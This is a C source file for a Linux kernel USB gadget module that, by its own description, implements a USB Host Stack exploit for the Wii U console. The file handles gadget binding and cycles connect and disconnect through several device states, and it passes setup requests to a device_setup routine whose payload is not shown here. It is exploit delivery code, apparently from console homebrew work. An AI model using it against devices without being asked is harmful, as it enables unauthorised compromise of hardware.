#include "main.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("GaryOderNichts");
MODULE_DESCRIPTION("Implements a USB Host Stack exploit for the Wii U");
MODULE_VERSION("0");

#define EP0_BUF_SIZE 0x10000 // matches UhsDevice's pEp0DmaBuf size

void udpih_handle_state_change(struct timer_list* timer)
{
    udpih_linux_device_t* device = container_of(timer, udpih_linux_device_t, state_timer);

    DEBUG("udpih_handle_state_change %d\n", device->common_dev.state);

    switch (device->common_dev.state) {
    case STATE_DEVICE0_READY:
        usb_gadget_disconnect(device->gadget);
        device->common_dev.state = STATE_DEVICE0_DISCONNECTED;
        device->common_dev.set_state_timer(&device->common_dev, 500);
        break;
    case STATE_DEVICE0_DISCONNECTED:
        usb_gadget_connect(device->gadget);
        device->common_dev.state = STATE_DEVICE1_CONNECTED;
        break;
    case STATE_DEVICE1_READY:
        usb_gadget_disconnect(device->gadget);
        device->common_dev.state = STATE_DEVICE1_DISCONNECTED;
        device->common_dev.set_state_timer(&device->common_dev, 500);
        break;
    case STATE_DEVICE1_DISCONNECTED:
        usb_gadget_connect(device->gadget);
        device->common_dev.state = STATE_DEVICE2_CONNECTED;
        break;
    default:
        ERROR("Invalid state %d\n", device->common_dev.state);
        break;
    }
}

void udpih_set_state_timer(udpih_device_t* device, uint32_t ms)
{
    udpih_linux_device_t* zero_device = container_of(device, udpih_linux_device_t, common_dev);

    if (ms == 0) {
        udpih_handle_state_change(&zero_device->state_timer);
        return;
    }

    mod_timer(&zero_device->state_timer, jiffies + msecs_to_jiffies(ms));
}

void udpih_setup_complete(struct usb_ep* ep, struct usb_request* req)
{
    udpih_linux_device_t* device;

    DEBUG("udpih_setup_complete\n");

    device = (udpih_linux_device_t*) ep->driver_data;

    if (req->status != 0 || req->actual != req->length) {
        WARNING("udpih_setup_complete fail: %d 0x%x / 0x%x\n", req->status, req->actual, req->length);
    }
    else {
        DEBUG("udpih_setup_complete success\n");
    }
}

void udpih_gadget_unbind(struct usb_gadget* gadget)
{
    udpih_linux_device_t* device;

    DEBUG("udpih_gadget_unbind\n");

    device = (udpih_linux_device_t*) get_gadget_data(gadget);
    if (!device) {
        return;
    }

    free_ep_request(gadget->ep0, device->ep0_request);
    kfree(device);
}

int	udpih_gadget_bind(struct usb_gadget* gadget, struct usb_gadget_driver* driver)
{
    udpih_linux_device_t* device;
    int result;

    DEBUG("udpih_gadget_bind\n");

    device = kzalloc(sizeof(udpih_linux_device_t), GFP_KERNEL);
    if (!device) {
        ERROR("Failed to allocate udpih_linux_device_t\n");
        return -ENOMEM;
    }

    set_gadget_data(gadget, device);
    device->gadget = gadget;

    // setup the state timer
    timer_setup(&device->state_timer, udpih_handle_state_change, 0);

    device->common_dev.set_state_timer = udpih_set_state_timer;

    usb_gadget_set_selfpowered(gadget);

    // allocate a request buffer for endpoint zero
    device->ep0_request = alloc_ep_request(gadget->ep0, EP0_BUF_SIZE);
    if (!device->ep0_request) {
        ERROR("Failed to allocate ep0_request\n");
        return -ENOMEM;
    }

    device->ep0_request->complete = udpih_setup_complete;
    gadget->ep0->driver_data = device;

    result = device_bind(&device->common_dev, device->gadget->ep0->maxpacket);
    if (result < 0) {
        udpih_gadget_unbind(gadget);
        return result;
    }

    return 0;
}

int udpih_gadget_setup(struct usb_gadget* gadget, const struct usb_ctrlrequest* ctrlrequest)
{
    udpih_linux_device_t* device;
    struct usb_request* request;
    int result = -ENODEV;

    DEBUG("udpih_gadget_setup\n");

    device = (udpih_linux_device_t*) get_gadget_data(gadget);
    request = device->ep0_request;

    if (device->common_dev.state == STATE_INIT) {
        device->common_dev.state = STATE_DEVICE0_CONNECTED;
    }

    result = device_setup(&device->common_dev, ctrlrequest, request->buf);

    // queue the endpoint request
    if (result >= 0) {
        request->length = result;
        request->zero = result < le16_to_cpu(ctrlrequest->wLength);
        result = usb_ep_queue(device->gadget->ep0, request, GFP_ATOMIC);
        if (result < 0) {
            WARNING("Failed to queue ep0 request: %d\n", result);
        }
    }

    return result;
}

void udpih_gadget_disconnect(struct usb_gadget* gadget)
{
    udpih_linux_device_t* device;

    DEBUG("udpih_gadget_disconnect\n");

    device = (udpih_linux_device_t*) get_gadget_data(gadget);
    if (device) {
        // if we disconnect in a state we shouldn't discconect in, reset the device
        if (device->common_dev.state == STATE_DEVICE0_CONNECTED
            || device->common_dev.state == STATE_DEVICE1_CONNECTED
            || device->common_dev.state == STATE_DEVICE2_CONNECTED) {
            device->common_dev.state = STATE_INIT;
            del_timer(&device->state_timer);
        }
    }
}

void udpih_gadget_suspend(struct usb_gadget* gadget)
{
    udpih_linux_device_t* device;

    DEBUG("udpih_gadget_suspend\n");

    device = (udpih_linux_device_t*) get_gadget_data(gadget);
    if (device) {
        // reset device on suspend
        device->common_dev.state = STATE_INIT;
        del_timer(&device->state_timer);
    }
}

void udpih_gadget_resume(struct usb_gadget* gadget)
{
    DEBUG("udpih_gadget_resume\n");
}

void udpih_gadget_reset(struct usb_gadget* gadget)
{
    DEBUG("udpih_gadget_reset\n");
}

static struct usb_gadget_driver gadget_driver = {
    .function   = (char*) "Wii U USB Host Stack exploit",
    .max_speed  = USB_SPEED_HIGH,
    .bind       = udpih_gadget_bind,
    .unbind     = udpih_gadget_unbind,
    .setup      = udpih_gadget_setup,
    .disconnect = udpih_gadget_disconnect,
    .suspend    = udpih_gadget_suspend,
    .resume     = udpih_gadget_resume,
    .reset      = udpih_gadget_reset,
    .driver     = {
        .name  = (char*) "udpih",
        .owner = THIS_MODULE,
    },
};

int __init udpih_init(void)
{
    DEBUG("udpih_init\n");

    return usb_gadget_probe_driver(&gadget_driver);
}

void __exit udpih_exit(void)
{
    DEBUG("udpih_exit\n");

    usb_gadget_unregister_driver(&gadget_driver);
}

module_init(udpih_init);
module_exit(udpih_exit);
